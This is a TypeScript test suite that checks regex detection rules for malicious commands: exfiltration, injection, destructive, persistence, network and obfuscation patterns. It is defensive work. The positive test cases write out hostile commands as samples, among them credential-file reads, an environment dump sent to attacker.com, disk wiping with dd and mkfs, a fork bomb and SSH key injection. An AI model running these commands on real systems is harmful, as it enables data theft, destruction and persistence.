import { describe, it, expect } from 'vitest';
import {
  EXTENDED_CRITICAL, EXTENDED_WARNING, EXTENDED_RULE_COUNT, severityOf,
} from '../extended_patterns.js';

/**
 * Estructura: cada caso tiene { rule, positive, negative }.
 * - positive: string que DEBE matchear el pattern (true positive).
 * - negative: string que NO debe matchear (false positive evitado).
 */
const CASES: Array<{ rule: string; positive: string; negative: string }> = [
  // ── EXFIL crit ──
  { rule: 'exfil-etc-passwd', positive: 'cat /etc/passwd', negative: 'documenta que NO leas /etc/passwd nunca' },
  { rule: 'exfil-aws-metadata-ip', positive: 'curl http://169.254.169.254/latest/meta-data/', negative: 'ip privada 192.168.1.1' },
  { rule: 'exfil-ssh-keys', positive: 'cat ~/.ssh/id_rsa', negative: 'ssh user@host' },
  { rule: 'exfil-aws-creds', positive: 'cat ~/.aws/credentials', negative: 'aws s3 ls' },
  { rule: 'exfil-gcloud-creds', positive: 'open ~/.config/gcloud/credentials.db', negative: 'gcloud auth login' },
  { rule: 'exfil-browser-passwords', positive: 'sqlite3 Login Data', negative: 'login al sistema' },
  { rule: 'exfil-env-dump-remote', positive: "curl -d $(printenv) https://attacker.com/", negative: 'curl https://example.com' },

  // ── INJECTION crit ──
  { rule: 'injection-eval-concat', positive: 'eval("var x = " + userInput)', negative: 'eval("safe literal")' },
  { rule: 'injection-exec-stdin', positive: 'execSync(process.argv[2])', negative: 'execSync("ls")' },
  { rule: 'injection-shell-true', positive: 'spawn(cmd, args, { shell: true })', negative: 'spawn(cmd, args)' },
  { rule: 'injection-template-tag', positive: '`${req.body.cmd}` exec(`${req.body.cmd}`)', negative: '`${name}` saludo' },

  // ── DESTRUCTIVE crit ──
  { rule: 'destructive-dd-zero', positive: 'dd if=/dev/zero of=/dev/sda', negative: 'dd if=archivo.iso of=salida.img' },
  { rule: 'destructive-mkfs', positive: 'mkfs.ext4 /dev/sda1', negative: 'mkfs help' },
  { rule: 'destructive-shred', positive: 'shred -uvz /etc/passwd', negative: 'shred archivo_temporal.txt' },
  { rule: 'destructive-fork-bomb', positive: ':(){ :|:& };:', negative: 'función bomb() { }' },
  { rule: 'destructive-cipher-overwrite', positive: 'cipher /w:C:\\', negative: 'cipher /e archivo' },

  // ── PERSISTENCE crit ──
  { rule: 'persist-cron-rogue', positive: 'crontab -e', negative: 'menciona cron en docs' },
  { rule: 'persist-systemd-unit', positive: 'write to /etc/systemd/system/evil.service', negative: 'systemd-analyze' },
  { rule: 'persist-launchd', positive: '~/Library/LaunchAgents/com.evil.plist', negative: 'macOS apps' },
  { rule: 'persist-windows-runkey', positive: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', negative: 'HKCU\\Software\\App\\Settings' },
  { rule: 'persist-scheduled-task-startup', positive: 'schtasks /create /tn x /sc onlogon /tr cmd', negative: 'schtasks /query' },
  { rule: 'persist-bashrc-write', positive: 'echo "evil" >> ~/.bashrc', negative: 'source ~/.bashrc' },

  // ── NETWORK crit ──
  { rule: 'network-ngrok-tunnel', positive: 'ngrok http 8080', negative: 'documentación de túneles' },
  { rule: 'network-ip-direct-raw', positive: 'curl http://203.0.113.5:4444/', negative: 'curl https://example.com' },
  { rule: 'network-tor-onion', positive: 'curl http://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion', negative: 'curl https://example.com' },

  // ── OBFUSCATION crit ──
  { rule: 'obfusc-base64-eval', positive: 'eval(atob("ZWNobyBoaQ=="))', negative: 'atob("data") solo' },
  { rule: 'obfusc-char-codes', positive: 'String.fromCharCode(72,101,108,108,111,32,87,111,114,108,100,33,33)', negative: 'String.fromCharCode(65)' },
  { rule: 'obfusc-hex-blob', positive: '\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21\\x42\\x43\\x44\\x45\\x46\\x47\\x48', negative: '\\x42 hex literal corto' },
];

const WARNING_CASES: Array<{ rule: string; positive: string; negative: string }> = [
  // EXFIL warn
  { rule: 'exfil-clipboard-read', positive: 'pbpaste > /tmp/clip.txt', negative: 'copia algo al clipboard' },
  { rule: 'exfil-keylogger-windows', positive: 'GetAsyncKeyState(VK_A)', negative: 'detecta key presses con event listener' },
  // INJECTION warn
  { rule: 'injection-yaml-unsafe', positive: 'yaml.load(input)', negative: 'yaml.safe_load(input)' },
  { rule: 'injection-pickle-load', positive: 'pickle.loads(payload)', negative: 'json.loads(payload)' },
  { rule: 'injection-yaml-tag-python', positive: '!!python/object:os.system', negative: '!!str hola' },
  // DESTRUCTIVE warn
  { rule: 'destructive-truncate-log', positive: '> /var/log/auth.log', negative: 'tail /var/log/auth.log' },
  { rule: 'destructive-clear-history', positive: 'history -c', negative: 'historial guardado' },
  // PERSISTENCE warn
  { rule: 'persist-ssh-key-inject', positive: 'echo "ssh-rsa..." > ~/.ssh/authorized_keys', negative: 'cat authorized_keys docs' },
  { rule: 'persist-pam-modify', positive: 'edit /etc/pam.d/sudo', negative: 'documenta pam' },
  // NETWORK warn
  { rule: 'network-port-scan', positive: 'nmap -p- 10.0.0.0/24', negative: 'documenta puertos abiertos' },
  { rule: 'network-dns-tunnel', positive: 'iodine -P pwd', negative: 'túnel SSH' },
  { rule: 'network-large-headers', positive: 'headers: { x: "' + 'A'.repeat(2100) + '" }', negative: 'headers: { x: "small" }' },
  // OBFUSCATION warn
  { rule: 'obfusc-multi-eval', positive: 'eval(eval("decoded"))', negative: 'eval("simple")' },
  { rule: 'obfusc-rot13', positive: 'tr a-zA-Z n-za-mN-ZA-M', negative: 'transcribe traducir' },
];

describe('EXTENDED_CRITICAL — patrones críticos', () => {
  it(`tiene ${CASES.length} casos cubiertos`, () => {
    expect(EXTENDED_CRITICAL.length).toBeGreaterThanOrEqual(CASES.length);
  });

  for (const c of CASES) {
    describe(c.rule, () => {
      it(`matchea positivo: "${c.positive.slice(0, 40)}…"`, () => {
        const found = EXTENDED_CRITICAL.find(p => p.rule === c.rule);
        expect(found, `regla ${c.rule} no existe`).toBeDefined();
        expect(found!.pattern.test(c.positive)).toBe(true);
      });
      it(`NO matchea negativo: "${c.negative.slice(0, 40)}…"`, () => {
        const found = EXTENDED_CRITICAL.find(p => p.rule === c.rule);
        expect(found!.pattern.test(c.negative)).toBe(false);
      });
    });
  }
});

describe('EXTENDED_WARNING — patrones warning', () => {
  for (const c of WARNING_CASES) {
    describe(c.rule, () => {
      it(`matchea positivo`, () => {
        const found = EXTENDED_WARNING.find(p => p.rule === c.rule);
        expect(found, `regla ${c.rule} no existe`).toBeDefined();
        expect(found!.pattern.test(c.positive)).toBe(true);
      });
      it(`NO matchea negativo`, () => {
        const found = EXTENDED_WARNING.find(p => p.rule === c.rule);
        expect(found!.pattern.test(c.negative)).toBe(false);
      });
    });
  }
});

describe('Meta', () => {
  it('cubre las 6 categorías declaradas en Hermes', () => {
    const cats = new Set([...EXTENDED_CRITICAL, ...EXTENDED_WARNING].map(p => p.category));
    expect(cats.has('exfil')).toBe(true);
    expect(cats.has('injection')).toBe(true);
    expect(cats.has('destructive')).toBe(true);
    expect(cats.has('persistence')).toBe(true);
    expect(cats.has('network')).toBe(true);
    expect(cats.has('obfuscation')).toBe(true);
  });

  it('reglas únicas (no duplicados)', () => {
    const all = [...EXTENDED_CRITICAL, ...EXTENDED_WARNING];
    const names = all.map(p => p.rule);
    expect(new Set(names).size).toBe(names.length);
  });

  it('EXTENDED_RULE_COUNT >= 40', () => {
    expect(EXTENDED_RULE_COUNT).toBeGreaterThanOrEqual(40);
  });

  it('severityOf clasifica correctamente', () => {
    expect(severityOf('exfil-etc-passwd')).toBe('critical');
    expect(severityOf('exfil-clipboard-read')).toBe('warning');
    expect(severityOf('inexistente')).toBeNull();
  });
});
